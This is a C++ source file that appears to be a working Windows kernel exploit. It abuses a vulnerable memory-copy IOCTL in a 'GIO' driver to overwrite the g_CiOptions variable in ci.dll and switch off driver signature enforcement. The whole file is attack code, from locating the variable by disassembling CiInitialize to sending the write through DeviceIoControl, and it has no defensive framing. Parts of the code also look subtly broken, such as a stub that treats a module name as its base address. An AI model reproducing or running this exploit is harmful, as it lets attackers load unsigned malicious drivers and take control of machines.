#include<windows.h>
#include "hde64.h"  //using hacker disassembler
#include<stdio.h>
#include <string.h>

BOOL SetPrivilege(
	HANDLE hToken,  // access token handle
	LPCTSTR lpszPrivilege,    // name of privilege to enable/disable
	BOOL bEnablePrivilege    // to enable (or disable privilege)
)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,                   // lookup privilege on local system
		lpszPrivilege,          // privilege to lookup
		&luid))                       // receives LUID of privilege

{
	wprintf(L"LookupPrivilegeValue() failed, error: %u\n", GetLastError());
	return FALSE;

}

	else
		wprintf(L"LookupPrivilegeValue() - \%s\ found!\n", lpszPrivilege);
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		wprintf(L"\%s\ was enabled!\n", lpszPrivilege);
}
	else
{
		tp.Privileges[0].Attributes = 0;
		wprintf(L"\%s\ was disabled!\n", lpszPrivilege);
}

	if (!AdjustTokenPrivileges(

		hToken,
		FALSE,      // If TRUE, function disables all privileges,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))

{

	wprintf(L"AdjustTokenPrivileges() failed to adjust the new privilege, error: %u\n", GetLastError());
	return FALSE;

}

	else
{
wprintf(L"AdjustTokenPrivileges() is OK - new privilege was adjusted!\n");
}

	return TRUE;

}


extern "C" {
ULONG_PTR supGetModuleBaseByName(LPSTR ModuleName)
	{
		return ULONG_PTR(ModuleName);
	}

LONG QueryCiOptions(PVOID MappedBase, ULONG_PTR * KernelBase);
ULONG_PTR supGetModuleBaseByName(
		_In_ LPSTR ModuleName);

RTL_OSVERSIONINFOW g_osv;

#define CI_DLL "ci.dll"

#define IOCTL_GIO_MEMCPY 0xC3502808 //vulnerable IOCTL

typedef struct _GIO_MemCpyStruct {
		ULONG64 dest;
		ULONG64* src;
		DWORD size;
} GIO_MemCpyStruct;


LONG QueryCiOptions(
		_In_ PVOID MappedBase,
		_Inout_ ULONG_PTR *KernelBase
	)
	{
		PBYTE        CiInitialize = NULL;
		ULONG        c, j = 0;
		LONG         rel = 0;
		hde64s hs;

		CiInitialize = (PBYTE)GetProcAddress((HMODULE)MappedBase, "CiInitialize");
		if (CiInitialize == NULL)
			return 0;

		if (g_osv.dwBuildNumber > 16199) {

			c = 0;
			j = 0;
			do {

				/* call CipInitialize-- win10*/
				if (CiInitialize[c] == 0xE8)
					j++;

				if (j > 1) {
					rel = *(PLONG)(CiInitialize + c + 1);
					break;
				}

				hde64_disasm(CiInitialize + c, &hs);
				if (hs.flags & F_ERROR)
					break;
				c += hs.len;

			} while (c < 256);

		}
		else {

			c = 0;
			do {

				/* jmp CipInitialize-- Win7 */
				if (CiInitialize[c] == 0xE9) {
					rel = *(PLONG)(CiInitialize + c + 1);
					break;
				}
				hde64_disasm(CiInitialize + c, &hs);
				if (hs.flags & F_ERROR)
					break;
				c += hs.len;

			} while (c < 256);

		}

		CiInitialize = CiInitialize + c + 5 + rel;
		c = 0;
		do {

			if (*(PUSHORT)(CiInitialize + c) == 0x0d89) 
			{
				rel = *(PLONG)(CiInitialize + c + 2);
				break;
			}
			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);

		CiInitialize = CiInitialize + c + 6 + rel;

		*KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;
		printf("%x", rel);

		return rel;
	}



ULONG_PTR QueryVariableAddress(
	VOID
)
{
	LONG rel = 0;
	SIZE_T SizeOfImage = 0;
	ULONG_PTR Result = 0, ModuleKernelBase = 0;
	CHAR *szModuleName;
	WCHAR *wszErrorEvent, *wszSuccessEvent;
	PVOID MappedBase = NULL;

	CHAR szFullModuleName[MAX_PATH * 2];


	szModuleName = CI_DLL;
	
	ModuleKernelBase = supGetModuleBaseByName(szModuleName);
	if (ModuleKernelBase == 0) {
		printf("EORROROROROROR\n");
		return 0;
	}

	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
		return 0;
	strcat_s(szFullModuleName, "\\");
	strcat_s(szFullModuleName, szModuleName);

	MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (MappedBase) {
				rel = QueryCiOptions(
				MappedBase,
				&ModuleKernelBase);
		

		if (rel != 0) {
			Result = ModuleKernelBase;
		}
		FreeLibrary((HMODULE)MappedBase);
	}
	

	return Result;
}
BOOL exploit_dri(ULONG64 dst, BOOL enable)
{
	GIO_MemCpyStruct mystruct;
	mystruct.dest = dst;
	ULONG64* cioptions = (ULONG64*)malloc(sizeof(ULONG64));
	if (enable)
		*cioptions = 0x6; //4|2
	else
		*cioptions = 0xe; //4|2|8
	mystruct.src = cioptions;
	mystruct.size = 1;

	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	wchar_t szDeviceNames[] = L"\\\\.\\GIO";
	HANDLE ghDriver = CreateFile(szDeviceNames, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ghDriver == INVALID_HANDLE_VALUE) {
		printf("Cannot get handle to driver \'%S\' - GetLastError:%d\n", szDeviceNames, GetLastError());
		return FALSE;
	}

	DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)&mystruct, sizeof(mystruct), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);

	CloseHandle(ghDriver);

	if (returned) {
		return TRUE;
	}
	return FALSE;
}
int main(int argc, char *argv[])
	{
		
		LPCTSTR lpszPrivilege = L"SeSecurityPrivilege";
		BOOL bEnablePrivilege = TRUE;
		HANDLE hToken;
		BOOL bRetValue;

		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
{
		wprintf(L"OpenProcessToken() failed, error %u\n", GetLastError());
		return FALSE;

}
		else
			wprintf(L"OpenProcessToken() is OK, got the handle!\n");
	bRetValue = SetPrivilege(hToken, lpszPrivilege, bEnablePrivilege);

	if (!bRetValue)
{
		wprintf(L"Failed to enable privilege, error %u\n", GetLastError());
		return FALSE;
}
	else
			wprintf(L"The privilege was enabled!\n");
		
		
	if (strcmp(argv[1], "-d") == 0)
		{
			ULONG64 gcioptions;
			gcioptions = QueryVariableAddress();
			exploit_dri(gcioptions,FALSE);
			printf("[+] Driver Signing has been DISABLED!\n");
		}
		return 0;
	}
}

